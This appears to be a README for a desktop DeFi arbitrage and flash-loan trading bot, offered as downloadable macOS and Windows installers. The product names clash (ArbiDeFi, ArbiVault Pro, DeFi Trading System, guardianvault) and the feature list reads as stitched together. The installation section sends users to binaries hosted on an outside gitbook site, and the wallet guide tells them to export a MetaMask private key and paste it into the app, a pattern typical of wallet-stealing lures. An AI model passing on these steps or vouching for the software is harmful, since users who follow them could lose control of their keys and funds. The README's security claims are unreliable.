ArbiDeFi merges the institutional‑grade desktop security and cross‑chain analytics, to search all arbitrage opportunites using “Flashbot” flash‑loan executor, delivering a comprehensive DEFI arbitrage bot that: monitors AMM vs. CEX spreads and MEV opportunities in real time , leverages dYdX, AAVE, Balancer flash loans routed through 1inch (and other) when profitable, supports automated limit‑order grids across Ethereum, BSC, Solana, Avalanche, Arbitrum, and more , and integrates yield‑farming/restaking recommendations via EigenLayer data. By unifying local key‑management, multi‑sig vaults, portfolio analytics, and Telegram‑based trade alerts, ArbiVault Pro turns automated software tools that interact with decentralized finance (DeFi) markets into a single, high‑performance desktop application.
<p align="center"><img width="900" height="600" src="pictures/dashboard.png" alt="Bot interface" /></p>

## 🔑 Key Features & Modules
Each capability is a plugin adhering to a common Strategy interface—hot-swap modules without restarting the core engine.

- 🔄 Arbitrage Scanner:
   - AMM vs. AMM/CEX Arbitrage: Employs Hummingbot’s amm_arb strategy to watch any SPOT AMM DEX vs. SPOT CEX or CLOB DEX pair—placing offsetting orders when min_profitability exceeds your threshold after fees.
   - ArbitrageExecutor Engine: A specialized component simultaneously executes buy/sell orders across two markets (CEX↔DEX), validating profitability against gas and exchange fees before trades
   - Spot‑Perpetual Convergence: Bridges spot and perpetual markets, opening opposing positions when spreads breach min_divergence and closing upon min_convergence, capturing funding‑rate inefficiencies
   - Flash‑Loan Module: “Flashbot” fills 0x limit orders and carries out multi‑swap arbitrages by flash‑borrowing assets from dYdX and swapping on 1inch when price gaps permit profit
   - Grid & Limit Orders: Integrates a protocol enabling automated limit orders, efficiently adjustable w/ custom price ranges, grid trading like features—configurable per pair, per chain

- 🌾 Yield Farming & LP: APY vs. impermanent loss modeling, auto-compound flows
   - APY & Risk Comparison: Scans DeFi vaults, farms, and restaking pools—modeling impermanent‑loss vs. yield trade‑offs and EigenLayer re‑staking returns vs. slashing risk
   - Optimized Deployment: Recommends capital allocation that maximizes net APY after gas and potential slashing, with Monte Carlo VaR stress tests for capital at risk.

- 🔒 Secure Transaction Hub: Offline signing workflows via USB/NFC/QR, hardware wallet integration
   - Offline Signing & Hardware‑Wallets: Generates unsigned transactions locally, exports via QR or USB/NFC for Ledger/Trezor, and batches into multi‑sig proposals.
   - Multi‑Sig Vault Manager: On‑device co‑signer thresholds with encrypted logs, ensuring every action has cryptographic audit trails.

- 📊 Analytics & Risk:
   - Unified Dashboard: Aggregates on‑chain and CEX holdings, calculates FIFO/LIFO gains, and exports jurisdiction‑specific Form 8949 tax reports.
   - MEV Scanning: Alerts on Miner/Maximal Extractable Value opportunities, front‑run risks, and sandwich‑attack vectors

- 🏛️ RWA & Governance: Tokenized real-world assets, DAO proposal feeds, offline vote prep
   - Tokenized Assets: Tracks real‑world Treasuries, bonds, and commodities on Ondo, MakerDAO, and emerging protocols.
   - DAO Participation: Feeds real‑time governance proposals and enables offline vote signing for seamless on‑chain governance.

## Why It Works Locally
1. Enhanced Security & Privacy: All keys and logs remain on‑device—no browser XSS/CSRF or cloud‑server breach exposure.
2. Data Sovereignty: Encrypted SQLite database under user control; no third‑party cloud storage.
3. Superior Performance: Local light/full nodes (Geth/Nethermind) provide sub‑second RPC for arbitrage bots.
4. Offline Accessibility: Core analytics and order‑books function without internet—ideal for high‑security or remote environments.

## 📥 Installation & Setup
### macOS
1. Download the .dmg from [Releases](https://selenium-finance.gitbook.io/defi-algo-trading-bot-documentation/download/macos).
2. Open and drag DeFi Trading System to /Applications.
3. Approve notarization prompt.

### Windows

1. Download the .exe installer from [Releases](https://selenium-finance.gitbook.io/defi-algo-trading-bot-documentation/download/windows).
2. Run installer, enable sandboxed updates.
3. Finish setup wizard.

## ⚙️ Configuration & Customization

All module parameters live under Settings → Modules. Defaults are optimized for institutional workflows.

- Scan Frequency: 10–60 sec
- Profit/APY Thresholds: Customizable per strategy
- Slippage & Gas Caps: Set tolerance levels
- Accounting Methods: FIFO, LIFO, custom tags
- VaR Confidence & Horizon: 90–99%, 1–30 days
- Tax Jurisdiction: US‑IRS, EU, UK‑HMRC, custom

Settings are stored in an AES‑256 encrypted YAML file at ~/.guardianvault/config.yaml.

## 🔗 Wallet Connection Guide(MetaMask for exampale)
MetaMask Private Key
- Export key: MetaMask ▶️ Account ▶️ Import Account ▶️ Private Key
- In app: Settings ▶️ Add Wallet ▶️ Private Key
> 🚨 Always clear clipboard after pasting private keys.

## 👩‍💻 Usage Examples
```
# Optional: start local node
geth --syncmode light &

# Launch with custom RPC endpoint
defitradingsystem --rpc http://localhost:8545
```
1. Add Wallets: Paste addresses or scan WalletConnect.
2. Run Arbitrage Scan: Open Scanner, set thresholds, click Start.
3. Manage Yields: Browse pools, compare APYs, click Deploy.
4. Sign Offline: Generate TX, scan QR on Ledger/Trezor, then broadcast.

## 🔒 Security & Privacy
- Data Sovereignty: All data stays on-device in encrypted SQLite.
- Zero Cloud: No backend; eliminates XSS/CSRF and remote breaches.
- Hardware Wallets & Offline Signing: USB/NFC/QR workflows.
- Code-Signed Updates: Ensures integrity and sandbox compliance.
- Audit Trails: Every action cryptographically timestamped.

